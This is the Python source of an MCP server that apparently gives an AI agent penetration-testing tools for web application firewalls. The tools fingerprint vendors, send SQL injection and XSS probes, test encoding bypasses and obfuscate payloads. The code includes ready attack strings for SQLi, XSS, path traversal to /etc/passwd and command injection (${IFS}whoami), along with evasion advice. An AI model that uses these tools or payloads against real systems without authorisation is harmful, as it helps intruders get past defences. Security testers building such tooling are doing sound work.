#!/usr/bin/env python3
"""
SOCIS-AI-PT — WAF Detection MCP Server (HTTP transport)
Web Application Firewall fingerprinting and testing

Provides:
1. fingerprint_waf - Identify WAF/IPS in place
2. test_bypass - Test for WAF bypass techniques
3. analyze_evasion - Analyze evasion capabilities
"""

import json
import asyncio
import re
import subprocess
import logging
import httpx
import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
from typing import Any
from mcp_auth import verify_mcp_auth, mcp_auth_error

# ───────────────────────────────────────────────────────────
# CONFIGURATION
# ───────────────────────────────────────────────────────────

TOOL_NAME = "waf-detection"
MCP_PORT = 8107
MCP_VERSION = "1.0"
SERVER_NAME = f"{TOOL_NAME}-mcp"

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# ───────────────────────────────────────────────────────────
# TOOL DEFINITIONS
# ───────────────────────────────────────────────────────────

TOOLS = [
    {
        "name": "fingerprint_waf",
        "description": "Identify and fingerprint WAF/IPS/IDS in place. Detects vendor, version, and protection rules.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL or IP to test (e.g., https://example.com)"
                },
                "protocol": {
                    "type": "string",
                    "description": "Protocol to test (http, https, all)",
                    "default": "https",
                    "enum": ["http", "https", "all"]
                },
                "timeout": {
                    "type": "integer",
                    "description": "Timeout in seconds",
                    "default": 60
                }
            },
            "required": ["target"]
        }
    },
    {
        "name": "test_bypass",
        "description": "Test for WAF bypass techniques and vulnerabilities. Includes encoding, obfuscation, and protocol tricks.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL"
                },
                "payload": {
                    "type": "string",
                    "description": "Payload to test (e.g., SQL injection payload)"
                },
                "techniques": {
                    "type": "array",
                    "description": "Bypass techniques to test",
                    "items": {"type": "string"},
                    "default": ["url-encoding", "double-encoding", "case-variation", "unicode", "null-byte"]
                },
                "timeout": {
                    "type": "integer",
                    "description": "Timeout in seconds",
                    "default": 120
                }
            },
            "required": ["target", "payload"]
        }
    },
    {
        "name": "analyze_evasion",
        "description": "Analyze evasion capabilities and recommend best approach for bypassing detected WAF.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL"
                },
                "waf_type": {
                    "type": "string",
                    "description": "Known WAF type (auto-detected or manual)"
                },
                "attack_type": {
                    "type": "string",
                    "description": "Type of attack to analyze (xss, sqli, lfi, rce)",
                    "enum": ["xss", "sqli", "lfi", "rce"]
                }
            },
            "required": ["target", "attack_type"]
        }
    },
    {
        "name": "scan_waf_nmap",
        "description": "Scan for WAF using nmap NSE scripts. More thorough detection.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target host or URL"
                },
                "scripts": {
                    "type": "string",
                    "description": "Nmap WAF scripts to use",
                    "enum": ["http-waf-detect", "http-waf-fingerprint", "firewall-bypass", "http-waf-detect,vuln", "http-waf-fingerprint,vuln"],
                    "default": "http-waf-detect"
                },
                "port": {
                    "type": "integer",
                    "description": "Port to scan",
                    "default": 443
                }
            },
            "required": ["target"]
        }
    },
    {
        "name": "check_security_headers",
        "description": "Check for security headers (CSP, HSTS, X-Frame-Options, etc) that indicate WAF/protection.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL"
                }
            },
            "required": ["target"]
        }
    },
    {
        "name": "test_protocols",
        "description": "Test different HTTP protocol versions and methods for protocol-level WAF bypass.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL"
                },
                "method": {
                    "type": "string",
                    "description": "HTTP method to test",
                    "enum": ["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"],
                    "default": "GET"
                }
            },
            "required": ["target"]
        }
    },
    {
        "name": "detect_rate_limit",
        "description": "Test if the target has rate limiting or throttling.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL"
                },
                "requests": {
                    "type": "integer",
                    "description": "Number of requests to send",
                    "default": 20
                }
            },
            "required": ["target"]
        }
    },
    {
        "name": "test_tls_fingerprint",
        "description": "Test TLS fingerprinting and JA3/JA4 fingerprint detection.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL (https://...)"
                }
            },
            "required": ["target"]
        }
    },
    {
        "name": "obfuscate_payload",
        "description": "Apply WAF bypass obfuscation techniques to a single payload. Returns all variants. Techniques: base64, url_encode, unicode, hex, case_flip, comment_insert, concat, null_byte, double_encode, char_sub, waf_bypass_mode.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "payload": {
                    "type": "string",
                    "description": "The payload to obfuscate (e.g., ' OR 1=1-- or <script>alert(1)</script>)"
                },
                "techniques": {
                    "type": "array",
                    "description": "List of techniques to apply. Omit to apply all 11.",
                    "items": {
                        "type": "string",
                        "enum": ["base64", "url_encode", "unicode", "hex", "case_flip",
                                 "comment_insert", "concat", "null_byte", "double_encode",
                                 "char_sub", "waf_bypass_mode"]
                    }
                }
            },
            "required": ["payload"]
        }
    },
    {
        "name": "obfuscate_batch",
        "description": "Apply WAF bypass obfuscation to a list of payloads. Max 50 payloads. Returns obfuscated variants for all.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "payloads": {
                    "type": "array",
                    "description": "List of payloads to obfuscate (max 50)",
                    "items": {"type": "string"}
                },
                "techniques": {
                    "type": "array",
                    "description": "Techniques to apply sequentially. Omit to apply all 11.",
                    "items": {"type": "string"}
                }
            },
            "required": ["payloads"]
        }
    },
    {
        "name": "suggest_bypass",
        "description": "Auto-detect WAF and suggest the best bypass techniques + obfuscated payload variants for a given target and payload type.",
        "inputSchema": {
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "description": "Target URL to fingerprint and generate bypass for"
                },
                "payload": {
                    "type": "string",
                    "description": "Payload to obfuscate (default: ' OR 1=1--)",
                    "default": "' OR 1=1--"
                },
                "payload_type": {
                    "type": "string",
                    "description": "Attack type for context",
                    "enum": ["sqli", "xss", "lfi", "rce", "ssrf", "other"],
                    "default": "sqli"
                },
                "waf_type": {
                    "type": "string",
                    "description": "Known WAF type (skip auto-detection). Options: cloudflare, modsecurity, aws, akamai, f5, imperva"
                }
            },
            "required": ["target"]
        }
    },
]

# FastAPI app
app = FastAPI(title=f"SOCIS {TOOL_NAME} MCP Server", docs_url=None)

# ───────────────────────────────────────────────────────────
# MCP PROTOCOL HANDLERS
# ───────────────────────────────────────────────────────────

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "server": SERVER_NAME,
        "version": MCP_VERSION,
    }


@app.post("/mcp")
async def handle_mcp_request(request: Request):
    """Main MCP request handler"""
    if not verify_mcp_auth(request):
        return mcp_auth_error()
    try:
        data = await request.json()
        req_id = data.get("id")
        method = data.get("method")
        
        log.info(f"[MCP] Received request: {method}")
        
        if method == "tools/list":
            result = {"tools": TOOLS}
            return JSONResponse({"jsonrpc": "2.0", "id": req_id, "result": result})
        
        elif method == "tools/call":
            tool_name = data.get("params", {}).get("name")
            arguments = data.get("params", {}).get("arguments", {})
            
            log.info(f"[MCP] Executing tool: {tool_name}")
            
            if not any(t["name"] == tool_name for t in TOOLS):
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32000, "message": f"Unknown tool: {tool_name}"}},
                    status_code=400
                )
            
            try:
                # SSRF guard (fix H-5): tools that hit the network must not target
                # loopback / metadata / (optionally) private ranges.
                if tool_name not in ("obfuscate_payload", "obfuscate_batch", "suggest_bypass") and arguments.get("target"):
                    from mcp_auth import validate_url_target
                    validate_url_target(str(arguments["target"]))
                if tool_name == "fingerprint_waf":
                    result = await handle_fingerprint_waf(arguments)
                elif tool_name == "test_bypass":
                    result = await handle_test_bypass(arguments)
                elif tool_name == "analyze_evasion":
                    result = await handle_analyze_evasion(arguments)
                elif tool_name == "scan_waf_nmap":
                    result = await handle_scan_waf_nmap(arguments)
                elif tool_name == "check_security_headers":
                    result = await handle_check_security_headers(arguments)
                elif tool_name == "test_protocols":
                    result = await handle_test_protocols(arguments)
                elif tool_name == "detect_rate_limit":
                    result = await handle_detect_rate_limit(arguments)
                elif tool_name == "test_tls_fingerprint":
                    result = await handle_test_tls_fingerprint(arguments)
                elif tool_name == "obfuscate_payload":
                    result = handle_obfuscate_payload(arguments)
                elif tool_name == "obfuscate_batch":
                    result = handle_obfuscate_batch(arguments)
                elif tool_name == "suggest_bypass":
                    result = await handle_suggest_bypass(arguments)
                else:
                    raise ValueError(f"No handler for tool: {tool_name}")
                
                log.info(f"[MCP] Tool {tool_name} completed successfully")
                return JSONResponse({
                    "jsonrpc": "2.0",
                    "id": req_id,
                    "result": {"content": [{"type": "text", "text": json.dumps(result, indent=2)}]}
                })
            
            except ValueError as e:
                log.warning(f"[MCP] Validation error: {e}")
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32000, "message": str(e)}},
                    status_code=400
                )
            except asyncio.TimeoutError:
                log.error(f"[MCP] Tool execution timeout: {tool_name}")
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32603, "message": f"Tool execution timeout"}},
                    status_code=504
                )
            except Exception as e:
                log.error(f"[MCP] Tool execution error: {e}")
                return JSONResponse(
                    {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32603, "message": str(e)}},
                    status_code=500
                )
        
        else:
            return JSONResponse(
                {"jsonrpc": "2.0", "id": req_id, "error": {"code": -32601, "message": f"Method not found: {method}"}},
                status_code=404
            )
    
    except json.JSONDecodeError:
        return JSONResponse({"jsonrpc": "2.0", "id": None, "error": {"code": -32700, "message": "Parse error"}}, status_code=400)
    except Exception as e:
        log.error(f"[MCP] Unexpected error: {e}")
        return JSONResponse({"error": str(e)}, status_code=500)


# ───────────────────────────────────────────────────────────
# TOOL IMPLEMENTATIONS
# ───────────────────────────────────────────────────────────

async def handle_fingerprint_waf(args: dict) -> dict:
    """Fingerprint WAF/IPS/IDS using real HTTP probe requests."""
    target = args.get("target")
    timeout = int(args.get("timeout", 15))

    if not target:
        raise ValueError("'target' parameter is required")

    if not re.match(r'^[a-zA-Z0-9.\-_:/?=&%#+@]+$', target):
        raise ValueError(f"Invalid target format: {target}")

    # Ensure URL has a scheme
    url = target if target.startswith("http") else f"http://{target}"

    # Known WAF header/cookie/body signatures
    WAF_SIGNATURES: dict[str, list[str]] = {
        "Cloudflare":    ["cf-ray", "__cfduid", "cf-cache-status", "cloudflare"],
        "AWS WAF":       ["x-amzn-requestid", "x-amzn-trace-id", "awselb"],
        "Akamai":        ["akamai-grn", "akamai", "x-check-cacheable"],
        "Imperva/Incapsula": ["incap_ses", "visid_incap", "x-iinfo"],
        "Sucuri":        ["x-sucuri-id", "x-sucuri-cache"],
        "F5 BIG-IP":     ["bigipserver", "f5-bigip", "x-waf-event"],
        "ModSecurity":   ["mod_security", "modsecurity", "noyb"],
        "Barracuda":     ["barra_counter_session", "barracuda"],
        "Fortinet":      ["fortigate", "forticache"],
        "Nginx WAF":     ["nginx", "x-nginx-cache"],
    }

    detected_waf = "None detected"
    confidence = 0
    matched_signatures: list[str] = []
    status_normal = None
    status_probe = None
    server_header = ""
    response_headers: dict = {}

    try:
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True,
                                     verify=False) as client:
            # 1. Normal request
            try:
                r_normal = await client.get(url)
                status_normal = r_normal.status_code
                response_headers = dict(r_normal.headers)
                server_header = r_normal.headers.get("server", "")
                headers_str = str(response_headers).lower()
                body_preview = r_normal.text[:2000].lower()

                for waf_name, sigs in WAF_SIGNATURES.items():
                    for sig in sigs:
                        if sig in headers_str or sig in body_preview:
                            detected_waf = waf_name
                            confidence = max(confidence, 85)
                            matched_signatures.append(sig)
            except Exception:
                pass

            # 2. Probe request with malicious-looking payload
            try:
                r_probe = await client.get(
                    url,
                    params={"id": "1' OR '1'='1", "q": "<script>alert(1)</script>"},
                )
                status_probe = r_probe.status_code
                probe_body = r_probe.text[:500].lower()

                # Blocked by WAF → 403/406/429/503
                if status_probe in (403, 406, 429, 503) and status_normal not in (403, 406):
                    confidence = max(confidence, 70)
                    if detected_waf == "None detected":
                        detected_waf = "Unknown WAF"
                    # Check for WAF error pages in body
                    for waf_name, sigs in WAF_SIGNATURES.items():
                        for sig in sigs:
                            if sig in probe_body:
                                detected_waf = waf_name
                                confidence = max(confidence, 90)
                                matched_signatures.append(f"{sig} (in block page)")
            except Exception:
                pass

    except Exception as e:
        raise Exception(f"WAF detection failed: {e}")

    waf_detected = detected_waf != "None detected"
    return {
        "target": url,
        "status": "completed",
        "waf_detected": waf_detected,
        "waf_name": detected_waf,
        "detection_confidence": f"{confidence}%",
        "server_header": server_header,
        "response_headers": {k: v for k, v in list(response_headers.items())[:20]},
        "matched_signatures": matched_signatures,
        "http_status_normal": status_normal,
        "http_status_probe": status_probe,
        "recommendations": (
            [
                f"{detected_waf} WAF detected — consider WAF bypass techniques",
                "Test with encoded payloads (URL, Unicode, base64)",
                "Try request smuggling or chunked encoding bypasses",
                "Focus on logic flaws and second-order vulnerabilities",
            ]
            if waf_detected else
            [
                "No WAF detected — direct access to application",
                "Test for SQL injection, XSS, and injection without restrictions",
                "Consider adding a WAF for production deployments",
            ]
        ),
    }


async def handle_test_bypass(args: dict) -> dict:
    """Test WAF bypass techniques via real HTTP requests."""
    target = args.get("target")
    payload = args.get("payload")
    techniques = args.get("techniques", ["url-encoding", "double-encoding", "case-variation"])
    timeout = int(args.get("timeout", 30))

    if not target:
        raise ValueError("'target' parameter is required")
    if not payload:
        raise ValueError("'payload' parameter is required")

    if not re.match(r'^[a-zA-Z0-9.\-_:/?=&%#+@]+$', target):
        raise ValueError(f"Invalid target format: {target}")

    url = target if target.startswith("http") else f"http://{target}"

    # Encode variants
    def url_encode(s: str) -> str:
        from urllib.parse import quote
        return quote(s, safe="")

    def double_encode(s: str) -> str:
        from urllib.parse import quote
        return quote(quote(s, safe=""), safe="")

    def case_vary(s: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s))

    encodings = {
        "url-encoding": url_encode(payload),
        "double-encoding": double_encode(payload),
        "case-variation": case_vary(payload),
        "unicode": payload.replace("<", "\u003c").replace(">", "\u003e"),
        "null-byte": payload + "\x00",
    }

    results = []
    try:
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, verify=False) as client:
            for technique in techniques:
                encoded = encodings.get(technique, payload)
                try:
                    r = await client.get(url, params={"q": encoded})
                    blocked = r.status_code in (403, 406, 429, 503)
                    results.append({
                        "technique": technique,
                        "result": "blocked" if blocked else "passed",
                        "http_status": r.status_code,
                        "encoded_payload": encoded[:100],
                    })
                except Exception as e:
                    results.append({"technique": technique, "result": "error", "error": str(e)})
    except Exception as e:
        raise Exception(f"Bypass testing failed: {e}")

    passed = [r for r in results if r.get("result") == "passed"]
    return {
        "target": url,
        "payload": payload[:100],
        "techniques_tested": techniques,
        "status": "completed",
        "techniques_results": results,
        "successful_bypasses": len(passed),
        "failed_attempts": len(results) - len(passed),
        "recommendation": (
            f"Bypasses succeeded with: {', '.join(r['technique'] for r in passed)}"
            if passed else "All techniques were blocked by the WAF."
        ),
    }


async def handle_analyze_evasion(args: dict) -> dict:
    """Provide evasion strategy recommendations based on WAF type."""
    target = args.get("target")
    waf_type = args.get("waf_type", "Unknown")
    attack_type = args.get("attack_type")

    if not target:
        raise ValueError("'target' parameter is required")
    if not attack_type:
        raise ValueError("'attack_type' parameter is required")
    if attack_type not in ["xss", "sqli", "lfi", "rce"]:
        raise ValueError("attack_type must be one of: xss, sqli, lfi, rce")

    strategies_by_type = {
        "sqli": [
            {"strategy": "Comment injection", "example": "SELECT/**/FROM", "effectiveness": "high"},
            {"strategy": "Case variation", "example": "SeLeCt FROM", "effectiveness": "medium"},
            {"strategy": "HTTP parameter pollution", "example": "?id=1&id=2'--", "effectiveness": "medium"},
        ],
        "xss": [
            {"strategy": "Tag/attribute variation", "example": "<IMG SRC=x onerror=alert(1)>", "effectiveness": "high"},
            {"strategy": "JavaScript obfuscation", "example": "eval(atob('...'))", "effectiveness": "medium"},
            {"strategy": "SVG injection", "example": "<svg/onload=alert(1)>", "effectiveness": "high"},
        ],
        "lfi": [
            {"strategy": "Path traversal encoding", "example": "..%2F..%2Fetc%2Fpasswd", "effectiveness": "high"},
            {"strategy": "Null byte", "example": "../../etc/passwd%00", "effectiveness": "medium"},
        ],
        "rce": [
            {"strategy": "Command separator variation", "example": "cmd;whoami || cmd|whoami", "effectiveness": "medium"},
            {"strategy": "Environment variable substitution", "example": "${IFS}whoami", "effectiveness": "high"},
        ],
    }

    return {
        "target": target,
        "waf_type": waf_type,
        "attack_type": attack_type,
        "status": "completed",
        "evasion_strategies": strategies_by_type.get(attack_type, []),
        "general_tips": [
            "Combine multiple encoding techniques",
            "Use second-order/stored attack vectors to bypass input filters",
            "Test edge cases: very long inputs, null bytes, unicode normalization",
        ],
    }


async def handle_scan_waf_nmap(args: dict) -> dict:
    """Scan for WAF using nmap NSE scripts."""
    target = args.get("target")
    scripts = args.get("scripts", "http-waf-detect")
    port = args.get("port", 443)
    
    if not target:
        raise ValueError("'target' parameter is required")
    
    host = target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    
    cmd = ["nmap", "-p", str(port), "--script", scripts, host]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        output = result.stdout + result.stderr
        
        waf_found = "is behind WAF" in output or "WAF detected" in output
        
        return {
            "target": target,
            "host": host,
            "port": port,
            "nmap_scripts": scripts,
            "waf_detected": waf_found,
            "nmap_output": output[:3000],
            "recommendations": (
                ["WAF detected by nmap - use bypass techniques"] if waf_found
                else ["No WAF detected by nmap - may still be present"]
            )
        }
    except Exception as e:
        raise Exception(f"Nmap scan failed: {e}")


async def handle_check_security_headers(args: dict) -> dict:
    """Check for security headers that indicate WAF/protection."""
    target = args.get("target")
    
    if not target:
        raise ValueError("'target' parameter is required")
    
    url = target if target.startswith("http") else f"http://{target}"
    
    SECURITY_HEADERS = {
        "Content-Security-Policy": "CSP - helps prevent XSS",
        "Strict-Transport-Security": "HSTS - enforces HTTPS",
        "X-Frame-Options": "Clickjacking protection",
        "X-Content-Type-Options": "MIME sniffing protection",
        "X-XSS-Protection": "XSS filter (deprecated)",
        "Referrer-Policy": "Referrer privacy",
        "Permissions-Policy": "Feature permissions",
        "CF-Ray": "Cloudflare",
        "__cfduid": "Cloudflare",
        "X-Sucuri-": "Sucuri WAF",
        "X-iinfo": "Imperva/Incapsula",
        "X-Request-ID": "AWS/WAF",
    }
    
    try:
        async with httpx.AsyncClient(timeout=15, verify=False) as client:
            r = await client.get(url, follow_redirects=True)
            headers = dict(r.headers)
            
            found = {}
            for hdr, desc in SECURITY_HEADERS.items():
                for h, v in headers.items():
                    if hdr.lower() in h.lower():
                        found[h] = {"value": v[:100], "description": desc}
            
            return {
                "target": url,
                "status_code": r.status_code,
                "security_headers_found": found,
                "total_headers": len(headers),
                "protection_level": "Strong" if len(found) > 3 else "Basic" if found else "None detected",
                "recommendations": (
                    ["Add more security headers for better protection"] if len(found) < 3
                    else ["Good protection - test for bypasses"]
                )
            }
    except Exception as e:
        raise Exception(f"Header check failed: {e}")


async def handle_test_protocols(args: dict) -> dict:
    """Test different HTTP methods for protocol-level bypass."""
    target = args.get("target")
    method = args.get("method", "GET")
    
    if not target:
        raise ValueError("'target' parameter is required")
    
    url = target if target.startswith("http") else f"http://{target}"
    
    http_methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH", "HEAD", "TRACE", "CONNECT"]
    
    results = {}
    try:
        async with httpx.AsyncClient(timeout=15, verify=False) as client:
            for m in http_methods:
                try:
                    r = await client.request(m, url)
                    results[m] = {"status": r.status_code, "allowed": r.status_code != 405}
                except Exception as e:
                    results[m] = {"status": 0, "allowed": False, "error": str(e)[:50]}
    except Exception as e:
        raise Exception(f"Protocol test failed: {e}")
    
    allowed = [m for m, v in results.items() if v.get("allowed")]
    
    return {
        "target": url,
        "tested_method": method,
        "http_methods": results,
        "allowed_methods": allowed,
        "recommendations": (
            ["Test allowed methods for vulnerabilities"] if allowed
            else ["Only standard methods allowed - less attack surface"]
        )
    }


async def handle_detect_rate_limit(args: dict) -> dict:
    """Test for rate limiting/throttling."""
    target = args.get("target")
    requests = args.get("requests", 20)
    
    if not target:
        raise ValueError("'target' parameter is required")
    
    url = target if target.startswith("http") else f"http://{target}"
    
    statuses = []
    delays = []
    import time
    
    try:
        async with httpx.AsyncClient(timeout=15, verify=False) as client:
            for i in range(requests):
                start = time.time()
                try:
                    r = await client.get(url)
                    delays.append(time.time() - start)
                    statuses.append(r.status_code)
                except Exception as e:
                    statuses.append(0)
                await asyncio.sleep(0.1)
        
        unique_statuses = set(statuses)
        rate_limited = 429 in statuses or len([s for s in statuses if s == 0]) > requests // 2
        
        return {
            "target": url,
            "requests_sent": requests,
            "unique_status_codes": list(unique_statuses),
            "rate_limited": rate_limited,
            "avg_response_time": sum(delays) / len(delays) if delays else 0,
            "recommendations": (
                ["Rate limiting detected - use slower timing or distributed attacks"]
                if rate_limited else
                ["No rate limiting - direct attacks possible"]
            )
        }
    except Exception as e:
        raise Exception(f"Rate limit test failed: {e}")


async def handle_test_tls_fingerprint(args: dict) -> dict:
    """Test TLS fingerprinting and JA3/JA4 detection."""
    target = args.get("target")
    
    if not target:
        raise ValueError("'target' parameter is required")
    
    url = target if target.startswith("https") else f"https://{target}"
    
    import ssl
    import socket
    
    host = url.replace("https://", "").split("/")[0].split(":")[0]
    port = 443
    
    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                version = ssock.version()
        
        return {
            "target": url,
            "tls_version": version,
            "cipher_suite": cipher[0] if cipher else "Unknown",
            "server_name_indication": host,
            "certificate_subject": dict(x[0] for x in cert["subject"]) if cert else {},
            "recommendations": [
                "Check for TLS fingerprinting (JA3/JA4)",
                "Test custom TLS clients for detection evasion",
                "Use tools like tls-fingerprinting for detailed analysis"
            ]
        }
    except Exception as e:
        return {
            "target": url,
            "error": str(e),
            "recommendations": ["TLS handshake failed - check if HTTPS is supported"]
        }


# ───────────────────────────────────────────────────────────
# PAYLOAD OBFUSCATION ENGINE
# ───────────────────────────────────────────────────────────

import base64
import urllib.parse


class _ObfuscationEngine:
    """11 WAF bypass payload obfuscation techniques (pure Python, no deps)."""

    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()

    @staticmethod
    def url_encode(payload: str) -> str:
        return urllib.parse.quote(payload, safe="")

    @staticmethod
    def unicode_escape(payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def hex_escape(payload: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    @staticmethod
    def case_flip(payload: str) -> str:
        result = []
        for i, c in enumerate(payload):
            result.append(c.upper() if i % 2 == 0 else c.lower())
        return "".join(result)

    @staticmethod
    def comment_insert(payload: str) -> str:
        """Insert SQL/HTML comments between characters to break keyword matching."""
        keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP",
                    "SCRIPT", "ALERT", "ONERROR", "ONLOAD", "WHERE", "FROM"]
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                commented = "/**/".join(list(kw))
                import re as _re
                result = _re.sub(_re.escape(kw), commented, result, flags=_re.IGNORECASE)
        return result

    @staticmethod
    def concat_split(payload: str) -> str:
        """Split payload into SQL/JS string concatenation."""
        if len(payload) < 4:
            return payload
        mid = len(payload) // 2
        left = payload[:mid]
        right = payload[mid:]
        return f"'{left}'||'{right}'"

    @staticmethod
    def null_byte(payload: str) -> str:
        return f"%00{payload}"

    @staticmethod
    def double_encode(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    @staticmethod
    def char_substitute(payload: str) -> str:
        subs = {
            " OR ": " || ", " AND ": " && ",
            "=": " LIKE ", "<": "&lt;", ">": "&gt;",
            "'": "&#39;", '"': "&quot;",
        }
        result = payload
        for orig, repl in subs.items():
            result = result.replace(orig, repl)
        return result

    @staticmethod
    def waf_bypass_mode(payload: str) -> str:
        """Combine case_flip + comment_insert + url_encode for maximum evasion."""
        step1 = _ObfuscationEngine.case_flip(payload)
        step2 = _ObfuscationEngine.comment_insert(step1)
        return _ObfuscationEngine.url_encode(step2)

    @classmethod
    def apply(cls, payload: str, technique: str) -> str:
        handlers = {
            "base64": cls.base64_encode,
            "url_encode": cls.url_encode,
            "unicode": cls.unicode_escape,
            "hex": cls.hex_escape,
            "case_flip": cls.case_flip,
            "comment_insert": cls.comment_insert,
            "concat": cls.concat_split,
            "null_byte": cls.null_byte,
            "double_encode": cls.double_encode,
            "char_sub": cls.char_substitute,
            "waf_bypass_mode": cls.waf_bypass_mode,
        }
        fn = handlers.get(technique)
        if not fn:
            raise ValueError(f"Unknown technique '{technique}'. Valid: {list(handlers.keys())}")
        return fn(payload)

    @classmethod
    def all_techniques(cls) -> list[str]:
        return ["base64", "url_encode", "unicode", "hex", "case_flip",
                "comment_insert", "concat", "null_byte", "double_encode",
                "char_sub", "waf_bypass_mode"]


def handle_obfuscate_payload(args: dict) -> dict:
    """Apply obfuscation techniques to a single payload."""
    payload = str(args.get("payload") or "")
    if not payload:
        raise ValueError("'payload' parameter is required")

    techniques = args.get("techniques") or _ObfuscationEngine.all_techniques()
    if isinstance(techniques, str):
        techniques = [t.strip() for t in techniques.split(",")]
    techniques = [str(t).strip() for t in techniques if str(t).strip()]

    variants = []
    combined = payload
    for tech in techniques:
        try:
            result = _ObfuscationEngine.apply(payload, tech)
            variants.append({"technique": tech, "result": result})
            combined = _ObfuscationEngine.apply(combined, tech)
        except ValueError as e:
            variants.append({"technique": tech, "error": str(e)})

    return {
        "original": payload,
        "obfuscated_variants": variants,
        "combined": combined,
        "techniques_applied": techniques,
    }


def handle_obfuscate_batch(args: dict) -> dict:
    """Apply obfuscation techniques to a list of payloads."""
    payloads = args.get("payloads") or []
    if not payloads:
        raise ValueError("'payloads' parameter is required (list of strings)")
    if len(payloads) > 50:
        payloads = payloads[:50]

    techniques = args.get("techniques") or _ObfuscationEngine.all_techniques()
    if isinstance(techniques, str):
        techniques = [t.strip() for t in techniques.split(",")]
    techniques = [str(t).strip() for t in techniques if str(t).strip()]

    obfuscated: list[str] = []
    technique_map: dict = {}

    for payload in payloads:
        payload = str(payload)
        combined = payload
        for tech in techniques:
            try:
                combined = _ObfuscationEngine.apply(combined, tech)
            except ValueError:
                pass
        obfuscated.append(combined)
        if payload not in technique_map:
            technique_map[payload] = combined

    return {
        "obfuscated_payloads": obfuscated,
        "technique_map": technique_map,
        "techniques_applied": techniques,
        "count": len(obfuscated),
    }


async def handle_suggest_bypass(args: dict) -> dict:
    """Fingerprint WAF then suggest + generate ranked bypass payload variants."""
    target = str(args.get("target") or "")
    if not target:
        raise ValueError("'target' parameter is required")

    payload = str(args.get("payload") or "' OR 1=1--")
    payload_type = str(args.get("payload_type") or "sqli")

    # WAF-specific best technique recommendations
    waf_technique_map = {
        "cloudflare": ["url_encode", "case_flip", "comment_insert"],
        "modsecurity": ["case_flip", "comment_insert", "char_sub"],
        "aws": ["double_encode", "unicode", "null_byte"],
        "akamai": ["url_encode", "double_encode", "waf_bypass_mode"],
        "f5": ["comment_insert", "concat", "case_flip"],
        "imperva": ["unicode", "double_encode", "comment_insert"],
        "default": ["case_flip", "url_encode", "comment_insert", "waf_bypass_mode"],
    }

    # Try fingerprint first (best-effort, don't fail if WAF detection errors)
    waf_type = str(args.get("waf_type") or "").lower()
    if not waf_type:
        try:
            fp = await handle_fingerprint_waf({"target": target, "timeout": 15})
            waf_type = str(fp.get("waf_detected") or "").lower()
        except Exception:
            waf_type = "default"

    techniques = waf_technique_map.get(waf_type) or waf_technique_map["default"]

    variants = []
    for tech in techniques:
        try:
            variants.append({
                "technique": tech,
                "payload": _ObfuscationEngine.apply(payload, tech),
                "waf_specific": waf_type != "default",
            })
        except ValueError:
            pass

    # Also add the combined waf_bypass_mode variant
    try:
        variants.append({
            "technique": "waf_bypass_mode (combined)",
            "payload": _ObfuscationEngine.waf_bypass_mode(payload),
            "waf_specific": False,
        })
    except Exception:
        pass

    return {
        "target": target,
        "detected_waf": waf_type or "unknown",
        "original_payload": payload,
        "payload_type": payload_type,
        "recommended_techniques": techniques,
        "bypass_variants": variants,
        "note": "Test these variants manually or via ffuf/sqlmap to confirm WAF bypass.",
    }


# ───────────────────────────────────────────────────────────
# SERVER STARTUP
# ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    log.info(f"Starting {SERVER_NAME} on port {MCP_PORT}")
    uvicorn.run(app, host="0.0.0.0", port=MCP_PORT, log_level="info")
